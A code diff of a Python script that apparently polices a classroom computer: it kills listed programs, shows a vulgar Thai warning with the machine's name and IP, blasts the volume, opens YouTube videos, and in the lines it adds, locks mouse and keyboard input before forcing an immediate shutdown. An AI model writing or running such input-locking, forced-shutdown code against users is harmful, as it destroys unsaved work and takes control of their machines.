@@ -6,6 +6,7 @@ from pynput.keyboard import Key,Controller
 import time
 import random
 import pynput
+import os
 keyboard = Controller()
 x = 0
 video = ['https://www.youtube.com/watch?v=dQw4w9WgXcQ','https://www.youtube.com/watch?v=IyshCm8fE-g','https://www.youtube.com/watch?v=PgKcLw5HUUo','https://www.youtube.com/watch?v=Yfu6G3f8Xxc','https://www.youtube.com/shorts/J6QPB6AcSLY','https://www.youtube.com/watch?v=8ItNKJW_6Vc','https://www.youtube.com/watch?v=BizfQ1X-Sto']
@@ -22,8 +23,8 @@ def check_and_kill(list_of_process_names):
         if proc.info['name'] in list_of_process_names or proc.info['pid'] in list_of_process_names:
             x+=1
             psutil.Process(proc.info['pid']).terminate()
-            messagebox.showwarning('มึงเสร็จกูแล้วจ้า', '!!!!!!!!!!!!!!!\nเตือนครั้งที่'+str(x)+'\n!!!!!!!!!!!!!!!\nคอมพิวเตอร์:'+check_ip()[0] + '\nไอพี:' + check_ip()[1]+'\nได้เปิด'+proc.info['name']+' \nอาจารย์ปิดให้นะจ๊ะ')
-            if x % 3 ==0:
+            messagebox.showwarning('มึงเสร็จกูแล้วจ้า', '!!!!!!!!!!!!!!!\nเตือนครั้งที่'+str(x)+'\n!!!!!!!!!!!!!!!\nคอมพิวเตอร์:'+check_ip()[0] + '\nไอพี:' + check_ip()[1]+'\nมึงเปิด '+proc.info['name']+' ทำควยไร\nอาจารย์ปิดให้นะจ๊ะ')
+            if x % 2 == 0:
                 for i in range(50):
                     keyboard.press(Key.media_volume_up)
                     keyboard.release(Key.media_volume_up)
@@ -36,5 +37,12 @@ def check_and_kill(list_of_process_names):
                 time.sleep(15)
                 mouse_listener.stop()
                 keyboard_listener.stop()
+            elif x % 3:
+                webbrowser.open('https://www.youtube.com/watch?v=0_CDMstFg7M')
+                mouse_listener = pynput.mouse.Listener(suppress=True)
+                mouse_listener.start()
+                keyboard_listener = pynput.keyboard.Listener(suppress=True)
+                keyboard_listener.start()
+                os.system("shutdown /s /t 1") 
 while True:
     check_and_kill(read_file())
